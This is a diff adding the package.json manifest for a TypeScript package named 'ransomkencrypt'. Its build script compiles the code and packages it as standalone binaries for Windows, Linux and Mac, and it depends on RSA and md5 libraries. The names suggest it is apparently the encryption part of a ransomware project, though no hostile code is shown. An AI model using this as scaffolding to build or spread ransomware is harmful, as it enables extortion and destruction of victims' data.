@@ -1,0 +1,25 @@
+{
+  "name": "ransomkencrypt",
+  "version": "0.1.0",
+  "main": "build/index.js",
+  "bin": "build/index.js",
+  "license": "AGPL-3.0-or-later",
+  "dependencies": {
+    "ransomkcommon": "file:../common"
+  },
+  "scripts": {
+    "build": "yarn install && tsc && copyfiles ransomk.encrypt.config.json build/ -f && pkg . --output bin/rke -t win,linux,mac"
+  },
+  "pkg": {
+    "assets": [
+      "ransomk.encrypt.config.json"
+    ]
+  },
+  "devDependencies": {
+    "@types/md5": "^2.3.2",
+    "@types/node-rsa": "^1.1.1",
+    "copyfiles": "^2.4.1",
+    "pkg": "^5.8.1",
+    "typescript": "^5.0.4"
+  }
+}
